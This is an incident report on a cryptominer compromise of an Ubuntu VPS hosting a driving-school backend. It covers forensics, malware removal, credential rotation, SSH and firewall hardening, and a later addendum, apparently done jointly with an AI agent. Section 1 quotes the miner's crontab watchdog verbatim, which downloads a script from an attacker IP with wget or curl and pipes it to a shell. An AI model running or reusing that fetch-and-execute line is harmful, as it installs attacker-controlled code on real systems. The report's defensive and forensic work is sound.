# Security Incident Report — VPS Compromise (cryptominer)

**Server:** vps-murb (`108.181.215.244`, Ubuntu 26.04) — hosts the driving-school backend (`/home/project3`, PM2 app `driving-school`)
**Incident window:** compromise on or before **Sep 8, 2026 ~22:51 CAT** · discovered & remediated **Sep 13, 2026**
**Status:** ✅ FULLY REMEDIATED — all burned credentials rotated and verified, persistence removed, SSH hardened, monitoring + backups in place.

---

## 1. Detection

While reviewing the user's crontab during routine work, a suspicious entry was found next to the legitimate phone-audit job:

```
* * * * * /bin/sh -c '{ kill -0 16958 2>/dev/null || grep -q 0100007F:A71C /proc/net/tcp 2>/dev/null; } && exit 0;
(wget -qO- http://193.32.162.73/d/7c4124282c4ad7b6/init.sh || curl -sL http://193.32.162.73/d/7c4124282c4ad7b6/init.sh) | /bin/sh'
```

Classic miner watchdog: every minute, if the malware process (PID 16958) **or** its local port (`0100007F:A71C` = hex-reversed `127.0.0.1:42780`) is gone, re-download the payload from `193.32.162.73` and execute it.

Corroborating symptom: every deploy banner had shown **`cpu: 99.9%` / `ram: 84.5%`** for days — that was the miner, not the app.

## 2. Forensic findings (all gathered read-only before cleanup)

| Artifact | Detail |
|---|---|
| Malicious process | PID 16958, cmdline `redis-server r` (fake), exe → `/tmp/.kworkerd (deleted)`, running as `fidele` since **Sep 8**, **98.3% CPU + 61% RAM (2.1 GB)** |
| Hidden listener | `127.0.0.1:42780` (no real Redis installed — dpkg clean, no service) |
| Persistence | fidele's crontab line (above) |
| Leftovers | `/tmp/.redis-server.pid` (Sep 8 22:51 — approximate infection time), `/tmp/.kworkerd` |
| SSH keys | 3 entries in `authorized_keys`; fingerprints matched the user's own laptops; one duplicate line (attacker did **not** inject a key) |
| Rootkit checks | `/etc/ld.so.preload` absent, `atq` empty, root crontab only certbot, systemd only legit `pm2-fidele.service`, no suspicious hidden executables in `/tmp`, `/var/tmp`, `/dev/shm`, home |
| Likely entry vector | SSH **password** auth was enabled despite `sshd_config` line 78 saying `no` — the root-owned cloud-init drop-in `/etc/ssh/sshd_config.d/50-cloud-init.conf` contained `PasswordAuthentication yes`, and OpenSSH's include/first-match ordering made it win. The firewall offered `publickey,password`. |
| Scope of exposure | Malware ran as `fidele` for ~5 days: could read `/home/project3/.env` (DB + JWT + NextAuth + Google keys) and the old plaintext credentials visible in `~/.bash_history` |

## 3. Eradication (Sep 13, in safe order)

1. **Persistence first:** removed the malicious crontab line (`grep -v '193.32.162.73' | crontab -`); verified only the legitimate audit job remained.
2. **Killed the process:** `kill -9 16958`.
3. **Deleted artifacts:** `/tmp/.redis-server.pid`, `/tmp/.kworkerd`, plus sweeps of `/var/tmp`, `/dev/shm`, and hidden executables in `$HOME`.
4. **Verified no respawn:** process table clean immediately and after 2.5 minutes; load average fell to **0.09**; `node`/`mysqld` became the top CPU consumers; outbound firewall rule added for `193.32.162.73`.
5. **Deduplicated** `authorized_keys` (3 → 2 lines), fingerprints verified against local keys.

## 4. Credential rotation (everything the malware could read)

| Secret | Action | Verification |
|---|---|---|
| MySQL `sxlvhdzo_admin@localhost` | `ALTER USER USER()` (socket account) | login OK (socket) |
| MySQL `sxlvhdzo_admin@'%'` | first ALTER missed it (`USER()` matched only the socket account; app connects over TCP) — fixed via `sudo mysql ALTER USER …@'%'` | **device-bound logins pass end-to-end** (`diag-two-accounts.js` on two real accounts) |
| `ACCESS_TOKEN_SECRET`, `REFRESH_TOKEN_SECRET`, `RESET_TOKEN_SECRET`, `NEXTAUTH_SECRET` | regenerated (48-byte hex) server-side, written to `.env` | app health 200; identity chain verified post-rotation |
| FCM service-account key | new key `daa0d358c8…` created in Google Console, uploaded to `/home/fidele/google-service-account.json` (600), `FIREBASE_*` + `GOOGLE_APPLICATION_CREDENTIALS` written into `.env` byte-exactly (OpenSSL round-trip validated) | live probe: OAuth authenticated, `messaging/invalid-argument` on dummy token = creds work; **old keys deleted in Google Console**, surviving key re-verified after deletion |
| Play Integrity "API key" | discovery: **Play Integrity rejects API keys entirely** (`401 API keys are not supported by this API`) — and the route's endpoint (`/v1/verifyPlayIntegrity`) never existed (Google 404 HTML → every real verification 502'd) | replaced with service-account **OAuth2 JWT-bearer** flow (`lib/google-oauth.ts`, scope `playintegrity`) + correct endpoint `POST /v1/{package}:decodeIntegrityToken`; live probe: token acquired + `400 INVALID_ARGUMENT` on fake token = auth & route OK |
| `GOOGLE_CLOUD_API_KEY` | obsolete (no code reads it) **and** burned — deleted from server `.env` | `grep` = 0 occurrences; app healthy |
| Sudo password (`fidele`) | rotated via `passwd` | — |
| SSH keys | verified clean (no attacker key); duplicate removed | fingerprint match local ↔ server |

**Rotation incident notes (transparency):** the first `.env` rewrite script had an argv-shift bug that wrote a mangled `DATABASE_URL` (caught by validation, app DB briefly unreachable); recovered the rotated password, rewrote correctly, verified. A second quoting bug truncated `FIREBASE_PRIVATE_KEY` in `.env`; solved by generating the file with a dedicated Node script and byte-exact round-trip validation before swapping. Both mistakes were safe-failure caught by validation, never leaked values.

**Artifacts destroyed:** `.env.pre-rotation`, `.env.backup` (shredded), 9 credential-bearing lines in `~/.bash_history` (cleared).

## 5. Hardening applied

| Layer | Before | After |
|---|---|---|
| SSH password auth | effectively **yes** (cloud-init drop-in won first-match) | **no** — `/etc/ssh/sshd_config.d/00-hardening.conf` (sorts before `50-cloud-init.conf`); externally verified: `Permission denied (publickey)` with `PubkeyAuthentication=no`; key login unaffected |
| SSH other | root login already off | `MaxAuthTries 3`, `LoginGraceTime 20`, `X11Forwarding no` |
| fail2ban | installed but idle (no jails responding) | **sshd jail active** (systemd backend): maxretry 4 / findtime 10m / bantime 1h **incrementing to 1w** |
| Monitoring | none | weekly `phone-audit` cron (also alerts on anomalies in its domain); fail2ban bans brute-force in real time |
| Backups | ad-hoc only | **nightly** `db-backup.sh` cron 02:30 — consistent InnoDB dump, gzip + integrity check, **14-day retention**, first backup taken and verified (1.4 MB) |
| Outbound | open | `iptables` DROP to `193.32.162.73` |

## 6. Current state (post-remediation snapshot)

- App: PM2 `driving-school` online, health 200, identity chain verified for real accounts
- DB: unique per phone in all formats, 0 variant collisions, nightly backups + weekly audit running
- Secrets: all rotated; no burned value remains on disk; Google side consistent (old keys revoked)
- SSH: key-only, hardened, fail2ban enforcing
- Cron (fidele): `phone-audit` (Mon 04:00) + `db-backup` (daily 02:30) only

## 7. Open items / recommendations

1. **Restore-path drill (recommended):** restore last night's `*.sql.gz` into a scratch DB once to prove the backup is usable, not just present.
2. **Off-site backups:** current backups live on the same VPS; copy `db-backups/` off-server (rclone → object storage) so a full VPS loss can't take them too.
3. **journald retention:** `wtmpdb` began only Sep 13 — the Sep 8 infection's login history is lost; `sudo journalctl -u ssh --since "2026-09-08"` may still hold evidence for the entry-vector review if journald kept it.
4. **Clean-OS reinstall** remains the gold standard when a maintenance window allows; nothing found suggests a rootkit, so it is optional, not urgent.
5. Optional: consider moving SSH off port 10040 → 22 behind the provider firewall, or WireGuard-only admin access.

---

## 8. Addendum — Sep 26, 2026

### 8.1 Follow-ups closed

| Item from §5/§7 | Action (Sep 26) |
|---|---|
| `unattended-upgrades` (§7.5) | **Enabled** — `systemctl enable --now unattended-upgrades` (was installed but inactive) |
| Admin password rotation | Rotated via the app's own API (`POST /api/auth/change-password`) with full verification: login → change → new password works → old password rejected. Full identity chain re-verified afterwards (login/token/profile/dashboard/refresh all OK) |
| Diagnostic scripts | All `diag-*.js` + `test-identity.sh` now **tracked in git** (commit `33a6fa4`) after review: they read credentials from `.env` at runtime; hardcoded real phone numbers removed from their CLI defaults first |
| `reset-admin-hash.js` | **Removed from git** (kept local-only, gitignored) — it overwrites the admin hash on whatever DB the local `.env` points at, so traveling with the repo would let anyone with a deploy seize the admin account |

### 8.2 Port 3001 — investigation, incident, and hardening

**What 3001 is:** the *marketing site* (`amategekoyumuhanda.rw`, the static `dev_website` export), served by a second nginx `server` block. The LB terminates SSL for both hostnames and forwards the apex site into VPS port 3001 (console traffic goes to port 80). The listener isn't in `sites-enabled/` — it lives in `sites-available/amategekoyumuhanda.rw`, which is why the first grep found nothing.

**Key discovery — VM/NAT ingress:** the VPS is a VM behind host NAT. ALL inbound traffic (LB-forwarded included) reaches nginx appearing to come from `192.168.122.1` (the libvirt bridge gateway), never from the LB's public IP. Proven with a marker test: three unique URLs fetched from outside appeared in the access log sourced from `192.168.122.1`.

**Consequence:** "allow only from the LB's public IP" is impossible at the VPS layer. Correct hardening is a source rule for `192.168.122.1` instead of a world-open port.

**Mini-incident during hardening (lesson learned):** the open `3001/tcp` rule was deleted before the replacement was in place, based on an earlier wrong conclusion that "3001 is already filtered upstream" (direct probes timed out — that was the LB simply not forwarding raw internet traffic, not provider filtering). Result: the marketing site went down (~20 min) until the rule was restored. **Lesson: never delete the old firewall rule until the replacement is active and verified with real traffic.**

**Final state (verified externally after the change):**

```
sudo ufw insert 1 allow from 192.168.122.1 to any port 3001 proto tcp
```

- `https://amategekoyumuhanda.rw` → 200 OK (through the hardened path)
- raw `:3001` from the internet → blocked

### 8.3 Port 80 hardening (completed later on Sep 26)

The same fix was applied to port 80 (console path), with insert-before-delete ordering: `allow from 192.168.122.1 to any port 80` inserted first, then the world-open `80/tcp` rule removed. External verification after the change: `/api/health` 200 ×3, `/admin/login` 200, marketing site unaffected. Console traffic continuing to flow with only the bridge rule in place empirically confirms the LB→:80 path also ingresses via `192.168.122.1`. (Note: the console nginx block logs to a different access log than the site block — its marker lines were not in `/var/log/nginx/access.log`.)

### 8.4 Remaining open

1. Restore-path drill (§7.1) and off-site backups (§7.2) remain open.

*Addendum added Sep 26, 2026.*

*Report generated Sep 13, 2026 — remediation performed jointly by fidele and Codebuff.*
